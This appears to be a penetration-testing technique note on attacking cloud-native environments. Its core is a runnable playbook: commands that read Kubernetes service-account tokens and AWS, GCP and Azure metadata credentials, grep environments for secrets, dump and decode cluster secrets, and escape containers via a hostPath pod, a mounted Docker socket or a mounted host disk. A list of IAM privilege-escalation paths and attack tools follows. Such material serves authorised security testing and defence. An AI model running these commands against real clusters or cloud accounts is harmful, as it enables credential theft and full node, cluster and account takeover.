---
category: technique
title: "Cloud-Native Attacks - Kubernetes, IAM, Container Escape"
tags: [cloud, kubernetes, k8s, iam, aws, gcp, azure, container-escape, imds, rbac, service-account, metadata, privilege-escalation, supply-chain]
---

# Cloud-Native Attacks

Cloud-native environments add layers that classic pentests do not have: the orchestrator (Kubernetes), the cloud control plane (IAM), and the container boundary. The recurring theme is identity - what identity does this workload carry, and what can that identity do that it should not?

The highest-impact path is almost always: get code execution in one container -> read its mounted credentials -> use those credentials to move laterally or escalate in the cloud control plane. The container is rarely the goal; it is the pivot.

---

## First question after any container foothold: what identity do I have?

```bash
# Kubernetes service account token - mounted into almost every pod by default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Cloud instance metadata - the crown jewels if reachable
# AWS (IMDSv1 - no token):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP:
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure:
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Environment - injected secrets, connection strings, cloud config
env | grep -iE "aws|gcp|azure|token|secret|key|password|kube"
```

The IMDS path overlaps with SSRF (see ssrf-techniques) - but with code execution in the container you hit it directly. IMDSv2 requires a PUT for a session token first; with shell access that is trivial.

---

## Kubernetes - what the service account can do

Once you have the service account token, enumerate its permissions instead of guessing:

```bash
# Point kubectl at the in-cluster API using the mounted token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc
alias k="kubectl --server=$APISERVER --token=$TOKEN --insecure-skip-tls-verify"

# What am I allowed to do? This single command drives the whole engagement
k auth can-i --list

# High-value capabilities to check explicitly
k auth can-i create pods
k auth can-i get secrets
k auth can-i create pods/exec
k auth can-i '*' '*'           # cluster-admin equivalent
```

**Dangerous permissions and what they give you:**

- `get/list secrets` -> read every secret in the namespace (DB creds, API keys, other SA tokens)
- `create pods` -> schedule a pod that mounts the host filesystem or a privileged SA, then exec into it = node compromise
- `pods/exec` -> shell into any existing pod, including more privileged ones
- `create pods` + node-level SA -> escalate to other workloads' identities
- access to `bind` ClusterRoles -> bind yourself to cluster-admin

**Privilege escalation via pod creation** (if you can create pods):
```yaml
# Schedule a pod that mounts the host root filesystem - escape to the node
apiVersion: v1
kind: Pod
metadata: { name: escape }
spec:
  containers:
  - name: x
    image: alpine
    command: ["sleep","999999"]
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes:
  - name: host
    hostPath: { path: / }
# Then: k exec escape -- chroot /host sh  -> you are root on the node
```

```bash
# Pull every secret you can reach and decode it
k get secrets -o json | jq -r '.items[] | .metadata.name'
k get secret <name> -o jsonpath='{.data}' | jq 'map_values(@base64d)'
```

---

## Container escape primitives

If the container is privileged or misconfigured, you break out to the node directly:

```bash
# Am I privileged? Check capabilities
capsh --print
cat /proc/self/status | grep CapEff      # 0000003fffffffff = all caps = privileged

# Docker socket mounted inside the container = trivial host takeover
ls -la /var/run/docker.sock
# If present: launch a container that mounts host / and chroot into it
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# Privileged container with host devices - mount the host disk
fdisk -l
mount /dev/sda1 /mnt && chroot /mnt

# CAP_SYS_ADMIN + cgroup release_agent escape (classic)
# CAP_SYS_PTRACE + hostPID -> inject into host processes
```

Check mounts always: `mount` and `cat /proc/mounts` - a hostPath mount of `/`, `/etc`, `/var/run/docker.sock`, or `/proc` is an escape.

---

## IAM privilege escalation (after stealing cloud credentials)

With credentials from IMDS or a mounted secret, enumerate then escalate:

```bash
# AWS - who am I, what can I do
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>

# Run automated privesc path discovery
# pacu (AWS exploitation framework) or enumerate-iam
```

**Classic AWS IAM privesc paths to look for** (any one = game over):
- `iam:CreateAccessKey` on another user -> mint keys for a more privileged identity
- `iam:AttachUserPolicy` / `PutUserPolicy` -> attach AdministratorAccess to yourself
- `iam:PassRole` + `lambda:CreateFunction`/`ec2:RunInstances` -> run code as a privileged role
- `iam:CreatePolicyVersion` -> rewrite an existing policy you are attached to
- `sts:AssumeRole` on an over-permissioned role

These are the cloud equivalent of the RBAC bypass checklist - the question is identical: can this identity grant itself more than it was meant to have?

---

## Supply chain and registry

```bash
# Pull and inspect images for baked-in secrets across all layers
trivy image registry.target.com/app:latest
dive registry.target.com/app:latest          # browse layer-by-layer

# Check for writable / anonymous-pull registries
curl -s https://registry.target.com/v2/_catalog
curl -s https://registry.target.com/v2/<image>/tags/list

# Secrets in image history (often deleted in a later layer but still present)
docker history --no-trunc <image>
```

A secret added in layer 3 and `rm`-ed in layer 5 is still in layer 3. Always scan all layers, not just the final filesystem.

---

## The cloud-native kill chain

```
RCE in container  ->  read SA token + hit IMDS  ->  enumerate identity (k auth can-i / aws iam)
   ->  read secrets OR create privileged pod OR escalate IAM  ->  node/cluster/account compromise
```

Every arrow is "what does this identity let me reach that I should not." Map the identity, enumerate its real permissions (never assume), then walk the shortest over-permission to the control plane.

---

## Tools

```bash
# Kubernetes
kubectl                  # the primary tool - auth can-i drives everything
kube-hunter              # automated cluster vuln scanner
kube-bench               # CIS benchmark - finds misconfig
peirates                 # k8s pentest / escalation framework

# Cloud
pacu                     # AWS exploitation framework
scoutsuite               # multi-cloud config audit
prowler                  # AWS/Azure/GCP security assessment
enumerate-iam            # brute the permissions of a set of AWS keys

# Container
trivy                    # image + filesystem vuln + secret scan
dive                     # layer-by-layer image inspection
amicontained            # what capabilities/escape primitives do I have

# Install
brew install kubectl trivy kube-bench
uv venv .venv && uv pip install scoutsuite prowler
# pacu: git clone https://github.com/RhinoSecurityLabs/pacu && uv pip install -r requirements.txt
```
